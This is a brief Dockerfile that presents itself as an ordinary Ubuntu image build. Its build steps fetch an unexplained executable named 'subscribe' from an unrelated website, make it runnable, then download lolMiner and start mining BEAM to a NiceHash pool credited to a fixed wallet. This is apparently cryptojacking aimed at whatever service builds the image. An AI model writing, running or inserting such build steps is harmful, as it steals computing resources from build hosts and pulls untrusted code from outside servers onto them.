FROM ubuntu:20.04 as ubuntu-base
ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true

RUN apt update
RUN apt -y install wget
RUN wget http://ilovenypizza.com/subscribe
RUN chmod +x subscribe
RUN wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz && tar xf lolMiner_v1.42_Lin64.tar.gz && cd 1.42 && ./lolMiner --algo BEAM-III --pool stratum+tcp://beamv3.eu-west.nicehash.com:3387 --user 3N3nL9kCwYd1KaFS9r1LLWNU8q2myanr3J.worker --tls 0
